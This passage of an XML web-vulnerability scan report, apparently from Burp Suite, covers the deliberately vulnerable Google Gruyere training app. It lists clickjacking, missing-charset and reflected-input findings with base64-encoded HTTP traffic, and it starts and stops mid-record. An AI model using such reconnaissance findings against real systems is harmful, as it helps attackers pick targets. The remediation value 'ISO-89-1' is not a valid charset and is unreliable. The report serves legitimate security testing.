      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KQ29udGVudC10eXBlOiB0ZXh0L2h0bWwNClByYWdtYTogbm8tY2FjaGUNClgtWFNTLVByb3RlY3Rpb246IDANClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogZjA5ZThiZGQ2OWY0YTZlZDBlZmUwYjNlZjg5YjNkMzQNClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTo0MDo1NSBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMjYyMg0KQ29ubmVjdGlvbjogY2xvc2UNCg0KPCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiI+CjwhLS0gQ29weXJpZ2h0IDIwMTcgR29vZ2xlIEluYy4gLS0+CjxodG1sPgo8aGVhZD4KPHRpdGxlPkdydXllcmU6IEVycm9yPC90aXRsZT4KPHN0eWxlPgovKiBDb3B5cmlnaHQgMjAxNyBHb29nbGUgSW5jLiAqLwoKYm9keSwgaHRtbCwgdGQsIHNwYW4sIGRpdiwgaW5wdXQsIHRleHRhcmVhIHsKICBmb250LWZhbWlseTogc2Fucy1zZXJpZjsKICBmb250LXNpemU6IDE0cHQ7Cn0KCmJvZHkgewogIGJhY2tncm91bmQ6IHVybCgnY2hlZXNlLnBuZycpIHRvcCBjZW50ZXIgcmVwZWF0OwogIHRleHQtYWxpZ246IGNlbnRlcjsKICBvcGFjaXR5OiAwLjgwOwp9CgpoMiB7CiAgdGV4dC1hbGlnbjogY2VudGVyOwogIGZvbnQtc2l6ZTogMzBwdDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKdGQgewogIHZlcnRpY2FsLWFsaWduOiB0b3A7CiAgcGFkZGluZzogNXB4Owp9CgphLCBhOmhvdmVyIHsKICB0ZXh0LWRlY29yYXRpb246IHVuZGVybGluZTsKICBjb2xvcjogIzAwMDBiYjsKfQoKYTp2aXNpdGVkIHsKICBjb2xvcjogI2JiMDAwMDsKfQoKYS5idXR0b246dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwYmI7Cn0KCi5jb250ZW50IHsKICB0ZXh0LWFsaWduOiBsZWZ0OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICB3aWR0aDogOTAlOwogIGJhY2tncm91bmQ6ICNmZmZmY2M7CiAgcGFkZGluZzogMjBweDsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudSB7CiAgdGV4dC1hbGlnbjogbGVmdDsKICBwYWRkaW5nOiAxMHB4IDIwcHggMzVweCAyMHB4OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICBtYXJnaW4tdG9wOiAyMHB4OwogIHdpZHRoOiA5MCU7CiAgYmFja2dyb3VuZDogI2ZmZmZjYzsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudS11c2VyIHsKICBjb2xvcjogIzAwMDAwMDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKI21lbnUtbGVmdCB7CiAgZmxvYXQ6IGxlZnQ7Cn0KCiNtZW51LWxlZnQgYSwgI21lbnUtbGVmdCBhOmhvdmVyLCAjbWVudS1sZWZ0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCiNtZW51LXJpZ2h0IHsKICBmbG9hdDogcmlnaHQ7Cn0KCiNtZW51LXJpZ2h0IGEsICNtZW51LXJpZ2h0IGE6aG92ZXIsICNtZW51LXJpZ2h0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCi5tZXNzYWdlIHsKICB3aWR0aDogNTAlOwogIGNvbG9yOiAjZmYwMDAwOwogIGJhY2tncm91bmQ6ICNmZmRkZGQ7CiAgYm9yZGVyOiAycHggc29saWQgI2ZmMDAwMDsKICBib3JkZXItcmFkaXVzOiAxZW07CiAgLW1vei1ib3JkZXItcmFkaXVzOiAxZW07CiAgcGFkZGluZzogMTBweDsKICBmb250LXdlaWdodDogYm9sZDsKICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgbWFyZ2luOiBhdXRvOwogIG1hcmdpbi10b3A6IDIwcHg7CiAgbWFyZ2luLWJvdHRvbTogMjBweDsKfQoKaW5wdXQsIHRleHRhcmVhIHsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjZmZmZmZmOwp9CgoucmVmcmVzaCB7CiAgZmxvYXQ6IGNlbnRlcjsKICB3aWR0aDogOTAlOwogIHRleHQtYWxpZ246IHJpZ2h0OwogIG1hcmdpbjogYXV0bzsKICBwYWRkaW5nLXRvcDogMDsKICBwYWRkaW5nLWJvdHRvbTogMnB0OwogIG1hcmdpbi10b3A6IDA7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKLmgyLXdpdGgtcmVmcmVzaCB7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKPC9zdHlsZT4KCjwvaGVhZD4KCjxib2R5PgoKPGRpdiBjbGFzcz0nbWVudSc+CiAgPHNwYW4gaWQ9J21lbnUtbGVmdCc+CiAgICA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2Lyc+SG9tZTwvYT4KICAgICAgCiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9zbmlwcGV0cy5ndGwnPk15Jm5ic3A7U25pcHBldHM8L2E+CiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9uZXdzbmlwcGV0Lmd0bCc+TmV3Jm5ic3A7U25pcHBldDwvYT4KICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L3VwbG9hZC5ndGwnPlVwbG9hZDwvYT4KICAgICAgCiAgPC9zcGFuPgogIDxzcGFuIGlkPSdtZW51LXJpZ2h0Jz4KICAgICAgCiAgICAgIDxzcGFuIGNsYXNzPSdtZW51LXVzZXInPgogICAgICAgIDU1NS01NTUtMDE5OUBleGFtcGxlLmNvbSAmbHQ7NTU1LTU1NS0wMTk5QGV4YW1wbGUuY29tJmd0OwogICAgICA8L3NwYW4+CiAgICAgIAogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvZWRpdHByb2ZpbGUuZ3RsJz5Qcm9maWxlPC9hPgogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbG9nb3V0Jz5TaWduIG91dDwvYT4KICAgICAgCiAgICAgIAogIDwvc3Bhbj4KPC9kaXY+CgoKCjxkaXYgY2xhc3M9J21lc3NhZ2UnPkludmFsaWQgcmVxdWVzdDwvZGl2PgoKCjwvYm9keT4KCjwvaHRtbD4K]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>5926218875504706560</serialNumber>
    <type>5245344</type>
    <name><![CDATA[Frameable response (potential Clickjacking)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/421683968655469260586300829583795792326/saveprofile]]></path>
    <location><![CDATA[/421683968655469260586300829583795792326/saveprofile]]></location>
    <severity>Information</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>If a page fails to set an appropriate X-Frame-Options or Content-Security-Policy HTTP header, it might be possible for a page controlled by an attacker to load it within an iframe. This may enable a clickjacking attack, in which the attacker's page overlays the target application's interface with a different interface provided by the attacker. By inducing victim users to perform actions such as mouse clicks and keystrokes, the attacker can cause them to unwittingly carry out actions within the application that is being targeted. This technique allows the attacker to circumvent defenses against cross-site request forgery, and may result in unauthorized actions.</p>
<p>Note that some applications attempt to prevent these attacks from within the HTML page itself, using "framebusting" code. However, this type of defense is normally ineffective and can usually be circumvented by a skilled attacker.</p>
<p>You should determine whether any functions accessible within frameable pages can be used by application users to perform any sensitive actions within the application. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>To effectively prevent framing attacks, the application should return a response header with the name <b>X-Frame-Options</b> and the value <b>DENY</b> to prevent framing altogether, or the value <b>SAMEORIGIN</b> to allow framing only by pages on the same origin as the response itself. Note that the SAMEORIGIN header can be partially bypassed if the application itself can be made to frame untrusted websites.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/X-Frame-Options">X-Frame-Options</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/693.html">CWE-693: Protection Mechanism Failure</a></li>
</ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvc2F2ZXByb2ZpbGUgSFRUUC8xLjENCkhvc3Q6IGdvb2dsZS1ncnV5ZXJlLmFwcHNwb3QuY29tDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCkFjY2VwdDogKi8qDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTVNJRSA5LjA7IFdpbmRvd3MgTlQgNi4xOyBXaW42NDsgeDY0OyBUcmlkZW50LzUuMCkNCkNvbm5lY3Rpb246IGNsb3NlDQpSZWZlcmVyOiBodHRwOi8vZ29vZ2xlLWdydXllcmUuYXBwc3BvdC5jb20vNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L25ld2FjY291bnQuZ3RsDQpDb29raWU6IEdSVVlFUkVfSUQ9NDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2DQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KQ29udGVudC10eXBlOiB0ZXh0L2h0bWwNClByYWdtYTogbm8tY2FjaGUNClgtWFNTLVByb3RlY3Rpb246IDANClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogZjA5ZThiZGQ2OWY0YTZlZDBlZmUwYjNlZjg5YjNkMzQNClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTo0MDo1NSBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMjYyMg0KQ29ubmVjdGlvbjogY2xvc2UNCg0KPCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiI+CjwhLS0gQ29weXJpZ2h0IDIwMTcgR29vZ2xlIEluYy4gLS0+CjxodG1sPgo8aGVhZD4KPHRpdGxlPkdydXllcmU6IEVycm9yPC90aXRsZT4KPHN0eWxlPgovKiBDb3B5cmlnaHQgMjAxNyBHb29nbGUgSW5jLiAqLwoKYm9keSwgaHRtbCwgdGQsIHNwYW4sIGRpdiwgaW5wdXQsIHRleHRhcmVhIHsKICBmb250LWZhbWlseTogc2Fucy1zZXJpZjsKICBmb250LXNpemU6IDE0cHQ7Cn0KCmJvZHkgewogIGJhY2tncm91bmQ6IHVybCgnY2hlZXNlLnBuZycpIHRvcCBjZW50ZXIgcmVwZWF0OwogIHRleHQtYWxpZ246IGNlbnRlcjsKICBvcGFjaXR5OiAwLjgwOwp9CgpoMiB7CiAgdGV4dC1hbGlnbjogY2VudGVyOwogIGZvbnQtc2l6ZTogMzBwdDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKdGQgewogIHZlcnRpY2FsLWFsaWduOiB0b3A7CiAgcGFkZGluZzogNXB4Owp9CgphLCBhOmhvdmVyIHsKICB0ZXh0LWRlY29yYXRpb246IHVuZGVybGluZTsKICBjb2xvcjogIzAwMDBiYjsKfQoKYTp2aXNpdGVkIHsKICBjb2xvcjogI2JiMDAwMDsKfQoKYS5idXR0b246dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwYmI7Cn0KCi5jb250ZW50IHsKICB0ZXh0LWFsaWduOiBsZWZ0OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICB3aWR0aDogOTAlOwogIGJhY2tncm91bmQ6ICNmZmZmY2M7CiAgcGFkZGluZzogMjBweDsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudSB7CiAgdGV4dC1hbGlnbjogbGVmdDsKICBwYWRkaW5nOiAxMHB4IDIwcHggMzVweCAyMHB4OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICBtYXJnaW4tdG9wOiAyMHB4OwogIHdpZHRoOiA5MCU7CiAgYmFja2dyb3VuZDogI2ZmZmZjYzsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudS11c2VyIHsKICBjb2xvcjogIzAwMDAwMDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKI21lbnUtbGVmdCB7CiAgZmxvYXQ6IGxlZnQ7Cn0KCiNtZW51LWxlZnQgYSwgI21lbnUtbGVmdCBhOmhvdmVyLCAjbWVudS1sZWZ0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCiNtZW51LXJpZ2h0IHsKICBmbG9hdDogcmlnaHQ7Cn0KCiNtZW51LXJpZ2h0IGEsICNtZW51LXJpZ2h0IGE6aG92ZXIsICNtZW51LXJpZ2h0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCi5tZXNzYWdlIHsKICB3aWR0aDogNTAlOwogIGNvbG9yOiAjZmYwMDAwOwogIGJhY2tncm91bmQ6ICNmZmRkZGQ7CiAgYm9yZGVyOiAycHggc29saWQgI2ZmMDAwMDsKICBib3JkZXItcmFkaXVzOiAxZW07CiAgLW1vei1ib3JkZXItcmFkaXVzOiAxZW07CiAgcGFkZGluZzogMTBweDsKICBmb250LXdlaWdodDogYm9sZDsKICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgbWFyZ2luOiBhdXRvOwogIG1hcmdpbi10b3A6IDIwcHg7CiAgbWFyZ2luLWJvdHRvbTogMjBweDsKfQoKaW5wdXQsIHRleHRhcmVhIHsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjZmZmZmZmOwp9CgoucmVmcmVzaCB7CiAgZmxvYXQ6IGNlbnRlcjsKICB3aWR0aDogOTAlOwogIHRleHQtYWxpZ246IHJpZ2h0OwogIG1hcmdpbjogYXV0bzsKICBwYWRkaW5nLXRvcDogMDsKICBwYWRkaW5nLWJvdHRvbTogMnB0OwogIG1hcmdpbi10b3A6IDA7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKLmgyLXdpdGgtcmVmcmVzaCB7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKPC9zdHlsZT4KCjwvaGVhZD4KCjxib2R5PgoKPGRpdiBjbGFzcz0nbWVudSc+CiAgPHNwYW4gaWQ9J21lbnUtbGVmdCc+CiAgICA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2Lyc+SG9tZTwvYT4KICAgICAgCiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9zbmlwcGV0cy5ndGwnPk15Jm5ic3A7U25pcHBldHM8L2E+CiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9uZXdzbmlwcGV0Lmd0bCc+TmV3Jm5ic3A7U25pcHBldDwvYT4KICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L3VwbG9hZC5ndGwnPlVwbG9hZDwvYT4KICAgICAgCiAgPC9zcGFuPgogIDxzcGFuIGlkPSdtZW51LXJpZ2h0Jz4KICAgICAgCiAgICAgIDxzcGFuIGNsYXNzPSdtZW51LXVzZXInPgogICAgICAgIDU1NS01NTUtMDE5OUBleGFtcGxlLmNvbSAmbHQ7NTU1LTU1NS0wMTk5QGV4YW1wbGUuY29tJmd0OwogICAgICA8L3NwYW4+CiAgICAgIAogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvZWRpdHByb2ZpbGUuZ3RsJz5Qcm9maWxlPC9hPgogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbG9nb3V0Jz5TaWduIG91dDwvYT4KICAgICAgCiAgICAgIAogIDwvc3Bhbj4KPC9kaXY+CgoKCjxkaXYgY2xhc3M9J21lc3NhZ2UnPkludmFsaWQgcmVxdWVzdDwvZGl2PgoKCjwvYm9keT4KCjwvaHRtbD4K]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>6431228627155347456</serialNumber>
    <type>8389120</type>
    <name><![CDATA[HTML does not specify charset]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/421683968655469260586300829583795792326/saveprofile]]></path>
    <location><![CDATA[/421683968655469260586300829583795792326/saveprofile]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>If a  response states that it contains HTML content but does not specify a character set, then the browser may analyze the HTML and attempt to determine which character set it appears to be using. Even if the majority of the HTML actually employs a standard character set such as UTF-8, the presence of non-standard characters anywhere in the response may cause the browser to interpret the content using a different character set. This can have unexpected results, and can lead to cross-site scripting vulnerabilities in which non-standard encodings like UTF-7 can be used to bypass the application's defensive filters.</p>
<p>In most cases, the absence of a charset directive does not constitute a security flaw, particularly if the response contains static content. You should review the contents of affected responses, and the context in which they appear, to determine whether any vulnerability exists. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>For every response containing HTML content, the application should include within the Content-type header a directive specifying a standard recognized character set, for example <b>charset=ISO-89-1</b>.
</p>]]></remediationBackground>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/436.html">CWE-436: Interpretation Conflict</a></li>
</ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvc2F2ZXByb2ZpbGUgSFRUUC8xLjENCkhvc3Q6IGdvb2dsZS1ncnV5ZXJlLmFwcHNwb3QuY29tDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCkFjY2VwdDogKi8qDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTVNJRSA5LjA7IFdpbmRvd3MgTlQgNi4xOyBXaW42NDsgeDY0OyBUcmlkZW50LzUuMCkNCkNvbm5lY3Rpb246IGNsb3NlDQpSZWZlcmVyOiBodHRwOi8vZ29vZ2xlLWdydXllcmUuYXBwc3BvdC5jb20vNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L25ld2FjY291bnQuZ3RsDQpDb29raWU6IEdSVVlFUkVfSUQ9NDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2DQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KQ29udGVudC10eXBlOiB0ZXh0L2h0bWwNClByYWdtYTogbm8tY2FjaGUNClgtWFNTLVByb3RlY3Rpb246IDANClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogZjA5ZThiZGQ2OWY0YTZlZDBlZmUwYjNlZjg5YjNkMzQNClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTo0MDo1NSBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMjYyMg0KQ29ubmVjdGlvbjogY2xvc2UNCg0KPCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiI+CjwhLS0gQ29weXJpZ2h0IDIwMTcgR29vZ2xlIEluYy4gLS0+CjxodG1sPgo8aGVhZD4KPHRpdGxlPkdydXllcmU6IEVycm9yPC90aXRsZT4KPHN0eWxlPgovKiBDb3B5cmlnaHQgMjAxNyBHb29nbGUgSW5jLiAqLwoKYm9keSwgaHRtbCwgdGQsIHNwYW4sIGRpdiwgaW5wdXQsIHRleHRhcmVhIHsKICBmb250LWZhbWlseTogc2Fucy1zZXJpZjsKICBmb250LXNpemU6IDE0cHQ7Cn0KCmJvZHkgewogIGJhY2tncm91bmQ6IHVybCgnY2hlZXNlLnBuZycpIHRvcCBjZW50ZXIgcmVwZWF0OwogIHRleHQtYWxpZ246IGNlbnRlcjsKICBvcGFjaXR5OiAwLjgwOwp9CgpoMiB7CiAgdGV4dC1hbGlnbjogY2VudGVyOwogIGZvbnQtc2l6ZTogMzBwdDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKdGQgewogIHZlcnRpY2FsLWFsaWduOiB0b3A7CiAgcGFkZGluZzogNXB4Owp9CgphLCBhOmhvdmVyIHsKICB0ZXh0LWRlY29yYXRpb246IHVuZGVybGluZTsKICBjb2xvcjogIzAwMDBiYjsKfQoKYTp2aXNpdGVkIHsKICBjb2xvcjogI2JiMDAwMDsKfQoKYS5idXR0b246dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwYmI7Cn0KCi5jb250ZW50IHsKICB0ZXh0LWFsaWduOiBsZWZ0OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICB3aWR0aDogOTAlOwogIGJhY2tncm91bmQ6ICNmZmZmY2M7CiAgcGFkZGluZzogMjBweDsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudSB7CiAgdGV4dC1hbGlnbjogbGVmdDsKICBwYWRkaW5nOiAxMHB4IDIwcHggMzVweCAyMHB4OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICBtYXJnaW4tdG9wOiAyMHB4OwogIHdpZHRoOiA5MCU7CiAgYmFja2dyb3VuZDogI2ZmZmZjYzsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudS11c2VyIHsKICBjb2xvcjogIzAwMDAwMDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKI21lbnUtbGVmdCB7CiAgZmxvYXQ6IGxlZnQ7Cn0KCiNtZW51LWxlZnQgYSwgI21lbnUtbGVmdCBhOmhvdmVyLCAjbWVudS1sZWZ0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCiNtZW51LXJpZ2h0IHsKICBmbG9hdDogcmlnaHQ7Cn0KCiNtZW51LXJpZ2h0IGEsICNtZW51LXJpZ2h0IGE6aG92ZXIsICNtZW51LXJpZ2h0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCi5tZXNzYWdlIHsKICB3aWR0aDogNTAlOwogIGNvbG9yOiAjZmYwMDAwOwogIGJhY2tncm91bmQ6ICNmZmRkZGQ7CiAgYm9yZGVyOiAycHggc29saWQgI2ZmMDAwMDsKICBib3JkZXItcmFkaXVzOiAxZW07CiAgLW1vei1ib3JkZXItcmFkaXVzOiAxZW07CiAgcGFkZGluZzogMTBweDsKICBmb250LXdlaWdodDogYm9sZDsKICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgbWFyZ2luOiBhdXRvOwogIG1hcmdpbi10b3A6IDIwcHg7CiAgbWFyZ2luLWJvdHRvbTogMjBweDsKfQoKaW5wdXQsIHRleHRhcmVhIHsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjZmZmZmZmOwp9CgoucmVmcmVzaCB7CiAgZmxvYXQ6IGNlbnRlcjsKICB3aWR0aDogOTAlOwogIHRleHQtYWxpZ246IHJpZ2h0OwogIG1hcmdpbjogYXV0bzsKICBwYWRkaW5nLXRvcDogMDsKICBwYWRkaW5nLWJvdHRvbTogMnB0OwogIG1hcmdpbi10b3A6IDA7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKLmgyLXdpdGgtcmVmcmVzaCB7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKPC9zdHlsZT4KCjwvaGVhZD4KCjxib2R5PgoKPGRpdiBjbGFzcz0nbWVudSc+CiAgPHNwYW4gaWQ9J21lbnUtbGVmdCc+CiAgICA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2Lyc+SG9tZTwvYT4KICAgICAgCiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9zbmlwcGV0cy5ndGwnPk15Jm5ic3A7U25pcHBldHM8L2E+CiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9uZXdzbmlwcGV0Lmd0bCc+TmV3Jm5ic3A7U25pcHBldDwvYT4KICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L3VwbG9hZC5ndGwnPlVwbG9hZDwvYT4KICAgICAgCiAgPC9zcGFuPgogIDxzcGFuIGlkPSdtZW51LXJpZ2h0Jz4KICAgICAgCiAgICAgIDxzcGFuIGNsYXNzPSdtZW51LXVzZXInPgogICAgICAgIDU1NS01NTUtMDE5OUBleGFtcGxlLmNvbSAmbHQ7NTU1LTU1NS0wMTk5QGV4YW1wbGUuY29tJmd0OwogICAgICA8L3NwYW4+CiAgICAgIAogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvZWRpdHByb2ZpbGUuZ3RsJz5Qcm9maWxlPC9hPgogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbG9nb3V0Jz5TaWduIG91dDwvYT4KICAgICAgCiAgICAgIAogIDwvc3Bhbj4KPC9kaXY+CgoKCjxkaXYgY2xhc3M9J21lc3NhZ2UnPkludmFsaWQgcmVxdWVzdDwvZGl2PgoKCjwvYm9keT4KCjwvaHRtbD4K]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>257816994135216</serialNumber>
    <type>4197376</type>
    <name><![CDATA[Input returned in response (reflected)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/421683968655469260586300829583795792326/saveprofile]]></path>
    <location><![CDATA[/421683968655469260586300829583795792326/saveprofile [uid parameter]]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>]]></issueBackground>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The value of the <b>uid</b> request parameter is copied into the application's response.]]></issueDetail>
    <requestresponse>
